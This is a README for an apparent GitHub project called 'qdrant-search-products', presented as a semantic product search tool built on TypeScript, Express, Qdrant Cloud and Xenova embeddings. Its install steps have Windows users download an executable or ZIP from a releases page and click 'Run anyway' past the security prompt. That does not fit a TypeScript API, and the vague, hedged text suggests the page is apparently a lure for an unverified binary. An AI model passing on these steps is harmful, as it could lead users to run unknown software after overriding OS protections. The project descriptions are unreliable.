# 🔎 qdrant-search-products - Search products with semantic precision

[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Darricksyllabled150/qdrant-search-products/releases)

## 🧭 What this app does

qdrant-search-products is a desktop-ready product search tool that helps you find items by meaning, not just exact words.

It uses:
- Qdrant Cloud for fast vector search
- Local embeddings with Xenova Transformers
- TypeScript and Express for the app layer
- A hybrid search setup that mixes semantic search with filter-based search

This makes it useful when a shopper types a broad request like:
- red running shoes for daily use
- phone case with strong protection
- cheap office chair for small room
- gift for coffee lover

The app tries to match the intent behind the search, then narrows results with product data such as price, category, or brand.

## 🖥️ What you need on Windows

Before you install, make sure your PC has:

- Windows 10 or Windows 11
- An internet connection
- At least 4 GB of RAM
- Around 500 MB of free disk space
- Permission to open downloaded files
- A modern browser such as Edge, Chrome, or Firefox

If your app package includes runtime files, you do not need to install extra tools. If it uses a portable build, you can run it right after download.

## 📥 Download and install

1. Open the [releases page](https://github.com/Darricksyllabled150/qdrant-search-products/releases)
2. Find the latest release
3. Download the Windows file from the assets list
4. If the file is a .zip, extract it to a folder
5. If the file is an .exe, double-click it to run the app
6. If Windows shows a security prompt, choose Run or More info > Run anyway if you trust the file
7. Wait for the app to open

If you keep the app in a folder such as Downloads or Desktop, it is easier to find later.

## 🚀 First setup

After you open the app, you may need to enter a few settings before it can search products.

Typical setup fields may include:

- Qdrant Cloud URL
- Qdrant API key
- Collection name
- Embedding model name
- Port number for the local server

Use the values from your Qdrant Cloud account if you already have one. If the app includes default values, you can start with those and change them later.

If the app opens in your browser, keep that tab open while you work.

## 🔍 How to use it

Use the app like a normal search page:

1. Type what you want to find
2. Press Search
3. Review the results
4. Use filters to narrow the list
5. Open a product when you find the right match

You can search with plain language. You do not need exact product names.

Examples:
- wireless earbuds with clear sound
- affordable gaming mouse
- laptop bag for travel
- brazilian skincare gifts
- kitchen items under 50 dollars

The app uses semantic search, so it looks at meaning as well as words. That helps when a customer does not know the exact title of a product.

## 🧩 Search features

This app is built for product lookup in a store or catalog. It focuses on fast and useful results.

Common search features include:

- Meaning-based search
- Product filtering
- Category matching
- Price filtering
- Brand matching
- Hybrid ranking
- Fast response from Qdrant
- Local embedding generation with Xenova Transformers

The hybrid approach is useful because it can combine:
- vector similarity for intent
- structured filters for exact limits

That means a search can be broad and flexible, yet still respect things like price range or category.

## 🛠️ Typical usage flow

A simple flow looks like this:

1. Load product data into the app or connect it to your data source
2. Create embeddings for product text
3. Store vectors in Qdrant
4. Search using a user query
5. Apply filters
6. Show the best matches

If your product list changes often, you may need to update the index so new items appear in search results.

## 📂 Useful product data fields

The app works best when your products include clear fields such as:

- name
- description
- category
- price
- brand
- tags
- color
- size
- stock status

Better data gives better results. Short, vague names make search weaker. Clear descriptions help the model match the right items.

## 🌐 Qdrant Cloud connection

If your setup uses Qdrant Cloud, you will need:

- the cluster URL
- the API key
- the collection name

The app sends vectors to Qdrant and pulls back matching records based on similarity. If the connection fails, check the URL, key, and network access first.

## 🤖 Local embeddings with Xenova

Xenova Transformers can create embeddings on your machine. This keeps the first search step close to the app and can reduce reliance on a remote model service.

This helps when you want:
- local text processing
- simpler deployment
- fewer external calls

The app may use a small text model that works well for product descriptions and user queries.

## 🧪 Example searches

Try these searches to test the app:

- black backpack for school
- running shoes for wide feet
- coffee maker for small kitchen
- affordable desk lamp
- natural soap for sensitive skin
- birthday gift for tech fan
- jacket for cold weather
- office headset with microphone

If you use filters too, the results can become much more accurate.

## 🧰 Common issues

If the app does not start, check these items:

- The file finished downloading
- You extracted the ZIP file, if needed
- Windows did not block the file
- The app has access to the internet
- Your Qdrant details are correct

If search results look wrong, check:

- product names and descriptions
- category labels
- spelling in the query
- filter settings
- whether the collection has data loaded

If the page stays blank, refresh it or restart the app.

## 📁 Folder and file tips

If you downloaded a ZIP file, use a simple folder path such as:

- C:\Users\YourName\Desktop\qdrant-search-products
- C:\Users\YourName\Downloads\qdrant-search-products

Avoid deep folder paths with many nested folders. Simple paths make files easier to find and reduce setup errors.

## 🔐 Data and access

This app may connect to cloud search data, so keep your API key private.

Good habits:
- do not post your key in public
- do not send your key by email
- store it in a safe local config file
- remove old keys if you no longer use them

If you share the app with someone else, do not include your own account details.

## 🧭 Best use cases

This project fits well in places like:

- ecommerce search tools
- product discovery pages
- catalog browsers
- proof of concept demos
- internal retail search
- multilingual product lookup
- RAG-style search workflows

It is useful when users know what they want, but not the exact product name.

## 🧾 Project details

- Name: qdrant-search-products
- Type: Product search API and search app
- Stack: TypeScript, Express, Qdrant Cloud, Xenova Transformers
- Search style: Semantic search with filter support
- Focus: Better product discovery

## 🧑‍💻 For simple testing

If you want to test the app after install, start with a small set of products:

- one category
- a few items with clear descriptions
- one or two filters
- short search phrases

This makes it easier to see how the search behaves before you load a full catalog

## 📌 Download again if needed

If you need the app later, use the same release page:

[Visit the releases page](https://github.com/Darricksyllabled150/qdrant-search-products/releases)

## 🧭 Quick start checklist

- Download the latest release
- Open or extract the file
- Run the Windows app
- Enter Qdrant details if asked
- Load or connect your product data
- Search using plain language
- Use filters to narrow results